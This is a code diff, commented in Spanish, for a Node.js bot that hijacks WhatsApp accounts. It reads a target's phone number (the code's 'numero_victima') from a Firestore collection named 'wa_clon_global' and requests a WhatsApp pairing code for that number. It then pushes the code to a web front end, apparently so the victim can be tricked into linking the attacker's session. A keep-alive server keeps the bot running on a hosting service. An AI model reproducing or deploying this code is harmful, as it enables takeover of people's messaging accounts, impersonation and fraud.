@@ -2,10 +2,12 @@ const { Client, LocalAuth } = require('whatsapp-web.js');
 const admin = require('firebase-admin');
 const http = require('http');
 
+// CONFIGURACIÓN FIREBASE
 const serviceAccount = require("./serviceAccountKey.json"); 
 if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
 const db = admin.firestore();
 
+// EL ROBOT SE INICIALIZA UNA SOLA VEZ Y SE QUEDA DESPIERTO
 const client = new Client({
     authStrategy: new LocalAuth({ clientId: "master_session" }),
     puppeteer: {
@@ -14,46 +16,42 @@ const client = new Client({
     }
 });
 
-// Función optimizada para generar el código de 8 dígitos
-async function generarCodigo(snap) {
+async function procesarPeticion(snap) {
     if (!snap.exists) return;
     const data = snap.data();
     
-    // Solo actuamos si el status es 'solicitando_codigo' y NO hay código aún
-    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
-        console.log("PROCESANDO NÚMERO: " + data.numero_victima);
+    // Solo actuamos si se solicita código y no hay uno previo guardado
+    if (data.status === "solicitando_codigo" && !data.pairingCode) {
+        console.log(">>> SOLICITANDO CÓDIGO PARA: " + data.numero_victima);
         try {
-            // Pedimos el pairing code a WhatsApp
+            // Pedimos el pairing code a WhatsApp (aquí es donde ocurre la magia)
             const code = await client.requestPairingCode(data.numero_victima);
-            console.log("ÉXITO - CÓDIGO: " + code);
+            console.log(">>> CÓDIGO GENERADO: " + code);
             
+            // Subimos el código a Firebase de inmediato
             await snap.ref.update({
                 pairingCode: code,
                 status: "mostrando_codigo"
             });
         } catch (err) {
-            console.log("FALLO: " + err.message);
-            // Si falla, le avisamos a la web para que el usuario reintente
+            console.log(">>> ERROR: " + err.message);
             await snap.ref.update({ status: "error" });
         }
     }
 }
 
-// Escuchar cambios en tiempo real
-db.collection("wa_clon_global").doc("current_session").onSnapshot(generarCodigo);
+// ESCUCHA EN TIEMPO REAL (Fuego rápido)
+db.collection("wa_clon_global").doc("current_session").onSnapshot(procesarPeticion);
 
 client.on('ready', () => {
-    console.log("MASTER SESSION ONLINE");
-    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
+    console.log(">>> MOTOR LISTO Y VINCULADO");
 });
 
-// Arrancar WhatsApp
-client.initialize().catch(e => console.log("Error Init:", e));
+// Arrancar motor de WhatsApp
+client.initialize();
 
-// Servidor de salud para que Render no apague el robot
+// SERVIDOR PARA QUE RENDER NO DUERMA AL ROBOT
 const port = process.env.PORT || 3000;
 http.createServer((req, res) => {
-    res.end('ROBOT ACTIVE');
-}).listen(port, () => {
-    console.log("Servidor iniciado en puerto " + port);
-});
+    res.end('MOTOR ONLINE');
+}).listen(port, () => console.log("Servidor en puerto " + port));
